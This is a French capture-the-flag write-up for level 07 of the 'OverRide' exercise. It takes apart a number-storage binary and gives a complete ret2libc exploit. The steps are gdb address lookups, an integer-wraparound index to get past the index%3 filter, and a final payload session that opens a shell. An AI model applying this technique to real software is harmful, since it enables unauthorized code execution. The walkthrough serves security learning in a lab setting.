# Level 07

## Solution

Le programme crée un tableau avec la capacité de stocker 100 entiers non signés (positifs). Il dispose de deux fonctions principales :

-   store_number : permet de stocker un entier à un indice donné dans le tableau, en vérifiant certaines conditions (comme un contrôle d'index réservé).
-   read_number : permet de lire un entier à un indice donné dans le tableau et de l'afficher.

Dans ce programme on peu constater plusieur point :

-   argv et envp sont vidés : Cela signifie que les arguments de ligne de commande (argv) et les variables d'environnement (envp) sont explicitement effacés en mémoire, ce qui les rend inutilisables pour un exploit ou une injection basée sur ces paramètres.
-   La condition (index % 3 == 0 || (unum >> 24) == 183) : Lorsque cette condition est vraie, le programme empêche de stocker le nombre à l'indice spécifié. Cela signifie que les indices multiples de 3 ou les nombres dont l'octet de poids fort (les 8 bits les plus à gauche) est égal à 183 ne seront pas stockés dans le tableau.
-   Absence de vérification d'index : Hormis la condition mentionnée ci-dessus, il n'y a aucune autre vérification sur l'index. Une vulnérabilité de dépassement de tampon (buffer overflow), permettant potentiellement d'écrire en dehors de la zone mémoire prévue pour le tableau.

Pour realiser notre exploit on va essayer d'effectuer un ret to libc, pour ce faire on va avoir besoin de trouver plusieur chose :
-   L'adresse de eip converti en index du tableau
-   L'adresse de notre tableau qui sert a stocker nos entrée
-   Les adresses de System, un padding et "/bin/sh"
-   L'index de l'adresse de retour dans notre tableau
-   L'index est multiplié par 4 donc chaque nombre que l'on veut stocker son stocker 4 fois plus loin
-   Comme une des 3 adresse entrera forcement dans la condition (**index % 3 == 0**), on devra trouver l'offset en fessant un wrapping

#### Adresse de Eip

Il suffit de faire **info frame** au debut du main pour recuperer l'adresse de retour :

```
(gdb) b main
(gdb) run 
(gdb) info f
Stack level 0, frame at 0xffffcf10:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffcf08, args: 
 Locals at 0xffffcf08, Previous frame's sp is 0xffffcf10
 Saved registers:
  ebp at 0xffffcf08, eip at 0xffffcf0c
```

Adresse de retour : 0xffffcf0c

#### Adresse du tableau

Pour recuper l'adresse de notre tableau, on peu mettre un breakpoint dans read_number ou store_number et regarder a **"ebp + 8"**, car l'adresse du tableau est passer en argument, donc elle se situe a 8 octet apres la base de la stack.

```
(gdb) b store_number 
Breakpoint 1 at 0x8048636
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x/x $ebp + 8
0xffffcd20:     0xffffcd44
```

On peu en conclure que l'adresse **0xffffcd20** stock la valeur **0xffffcd44**.

Adresse du tableau : 0xffffcd44

#### Adresse pour le payload

-   System :
```
    (gdb) p &system
    $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
```

-   Padding :
```
    0
```
-   Adresse de "/bin/sh" :
```
    (gdb) find &system,+9999999,"/bin/sh"
    0xf7f897ec
```

System : 0xf7e6aed0 -> Decimal = 4159090384
Padding : 0
"/bin/sh" : 0xf7f897ec -> Decimal = 4160264172

#### Calcul des index 

Pour calculer l'index de l'adresse de retour dans notre tableau on va juste calculer la distance entre l'adresse de retour et l'adresse du tableau :
```
0xffffcf0c - 0xffffcd44 = 456 / 4 (sur du 32bits) = 114
```

offset de l'adresse de retour : 114

index system : 114
index padding : 115
index /bin/sh : 116

#### Calcul du wraparound

Comme la condition (**index % 3 == 0**) est vrai pour 114 on va devoir utiliser une technique **"Wraparound"**, comme l'input pour l'index n'est pas verifier, puis notre nombre est stocker a l'index multiplier par 4 on va pouvoir mettre un nombre qui une fois multiplié par 4 fera 114 au moment du stockage :

-   UIN_MAX = 256 ^ 4 (pour du 32 bit)
```
    level07@OverRide:~$ bc
    bc 1.06.95
    Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.
    This is free software with ABSOLUTELY NO WARRANTY.
    For details type `warranty'. 
    256 ^ 4 / 4 + 114
    1073741938
    1073741938 % 3
    1
```

#### Recap

adress system : 4159090384
index system : 1073741938

adress padding : 0
index padding : 115

adress "/bin/sh" : 4160264172
index /bin/sh : 116

### Payload

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 0
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: exit
 Failed to do exit command
Input command: quit
$ 
```